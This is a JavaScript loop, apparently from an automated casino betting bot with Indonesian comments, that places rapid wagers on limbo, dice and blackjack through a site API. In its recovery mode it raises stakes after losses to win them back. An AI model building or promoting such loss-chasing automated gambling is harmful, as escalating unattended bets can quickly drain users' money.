    async function runLoop() {
        if (!bot.isRunning) return;
        
        // CEK TRIGGER RECOVERY
        checkRecoveryTrigger();
        
        // CEK APAKAH RECOVERY SELESAI
        if (bot.recoveryMode) {
            checkRecoveryComplete();
        }
        
        // AMBIL SETTINGS DARI UI
        const limboPayout = parseFloat(document.getElementById("p-limbo-payout").value) || 1.0001;
        const diceChance = parseFloat(document.getElementById("p-dice-chance").value) || 98;
        const limboCycles = parseInt(document.getElementById("p-limbo-cycles").value) || 3;
        const diceCycles = parseInt(document.getElementById("p-dice-cycles").value) || 2;
        
        let payout, nextbet, gameToPlay;
        
        // JIKA SEDANG DALAM MODE RECOVERY - GUNAKAN BLACKJACK
        if (bot.recoveryMode) {
            gameToPlay = "blackjack";
            bot.currentStatus = `RECOVERY #${bot.recoveryAttempts}`;
            
            // Hitung bet dengan progression
            const multiplier = getRecoveryMultiplier();
            nextbet = calculateRecoveryBet();
            
            bot.currentStatus = `RECOVERY #${bot.recoveryAttempts} (Step ${bot.recoveryConsecutiveLosses+1}/${multiplier}x)`;
            
            try {
                // Cek apakah ada game Blackjack yang sedang aktif
                if (bot.blackjackState.active && bot.blackjackState.identifier) {
                    // Ada game aktif, kita perlu menentukan hand mana yang sedang aktif
                    // Cek apakah hand pertama sudah selesai (jika split)
                    if (bot.blackjackState.playerHands.length > 1) {
                        // Split terjadi
                        const hand0 = bot.blackjackState.playerHands[0];
                        const hand0Value = calculateHandValue(hand0.cards);
                        const hand0Actions = hand0.actions || [];
                        // Jika hand0 sudah selesai (stand/bust/value>=21) maka pindah ke hand1
                        if (hand0Actions.includes('stand') || hand0Actions.includes('bust') || hand0Value >= 21) {
                            bot.blackjackState.currentHandIndex = 1;
                        } else {
                            bot.blackjackState.currentHandIndex = 0;
                        }
                    } else {
                        bot.blackjackState.currentHandIndex = 0;
                    }

                    // Dapatkan aksi berdasarkan strategi perfect
                    const decision = getPerfectBlackjackDecision(
                        bot.blackjackState.playerHands,
                        bot.blackjackState.dealerHand,
                        bot.blackjackState.currentHandIndex,
                        bot.blackjackState.insuranceOffered,
                        bot.recoveryInsurance
                    );

                    console.log(`Blackjack decision: ${decision} (Perfect Strategy)`);

                    // Kirim aksi
                    const res = await API.placeBet(null, null, "blackjack", {
                        action: decision,
                        identifier: bot.blackjackState.identifier
                    });

                    if (res.errors) {
                        bot.lastError = res.errors[0].message;
                        setTimeout(runLoop, 800);
                        return;
                    }

                    const gameData = parseBlackjackResponse(res);

                    // Cek apakah game sudah selesai
                    if (!bot.blackjackState.active) {
                        const betAmount = nextbet; // Gunakan nextbet yang sudah dihitung
                        const pnl = processBlackjackResult(res, betAmount);
                        console.log(`Blackjack hand completed | PnL: ${pnl.toFixed(8)}`);
                    }

                    updateBlackjackDisplay();
                } else {
                    // Tidak ada game aktif, place bet baru
                    const res = await API.placeBet(nextbet, null, "blackjack");

                    if (res.errors) {
                        bot.lastError = res.errors[0].message;
                        setTimeout(runLoop, 800);
                        return;
                    }

                    const gameData = parseBlackjackResponse(res);

                    // Cek apakah langsung selesai (blackjack)
                    if (gameData.blackjack || gameData.payout > 0) {
                        const pnl = processBlackjackResult(res, nextbet);
                        console.log(`Blackjack immediate result | PnL: ${pnl.toFixed(8)}`);
                        bot.blackjackState.active = false;
                        bot.blackjackState.identifier = null;
                    } else {
                        // Game masih aktif, simpan identifier
                        bot.blackjackState.identifier = gameData.identifier;
                        bot.blackjackState.active = true;
                        bot.blackjackState.currentHandIndex = 0; // mulai dari hand pertama
                    }

                    updateBlackjackDisplay();
                }

                if (bot.isRunning) {
                    setTimeout(runLoop, 0);
                }

            } catch (e) { 
                bot.lastError = "Network Error"; 
                console.error(e);
                if (bot.isRunning) setTimeout(runLoop, 1000); 
            }
        }
        
        // JIKA TIDAK DALAM RECOVERY - NORMAL LIMBO/DICE
        else {
            const useRecovery = document.getElementById("p-use-recovery").checked;
            bot.recoveryStatus = useRecovery ? "STANDBY" : "DISABLED";
            bot.currentStatus = "WAGERING";
            
            // Switch game antara limbo dan dice
            if (bot.switchCounter >= bot.nextSwitchAt) {
                if (bot.currentGame === "limbo") {
                    bot.currentGame = "dice";
                    bot.nextSwitchAt = diceCycles;
                } else {
                    bot.currentGame = "limbo";
                    bot.nextSwitchAt = limboCycles;
                }
                bot.switchCounter = 0;
            }
            
            gameToPlay = bot.currentGame;
            
            if (gameToPlay === "limbo") {
                payout = limboPayout;
            } else {
                payout = 100 / diceChance;
            }
            
            nextbet = calculateNormalBet();
            
            try {
                const res = await API.placeBet(nextbet, payout, gameToPlay);
                
                if (res.errors) { 
                    bot.lastError = res.errors[0].message; 
                    setTimeout(runLoop, 800); 
                    return; 
                }
                
                const data = res?.data || res;
                const bet = data.diceRoll || data.diceBet || data.limboBet;
                
                if (bet && bot.isRunning) {
                    bot.stats.bets++; 
                    bot.switchCounter++;
                    bot.stats.wagered += bet.amount;
                    const pft = (bet.payout - bet.amount);
                    bot.stats.profit += pft;
                    if (pft > 0) bot.stats.wins++; else bot.stats.loss++;
                    if (bot.stats.profit < bot.stats.maxDD) bot.stats.maxDD = bot.stats.profit;
                    bot.lastError = "None";
                }
                
                if (bot.isRunning) {
                    setTimeout(runLoop, 0);
                }
                
            } catch (e) { 
                bot.lastError = "Network Error"; 
                if (bot.isRunning) setTimeout(runLoop, 1000); 
            }
        }
    }

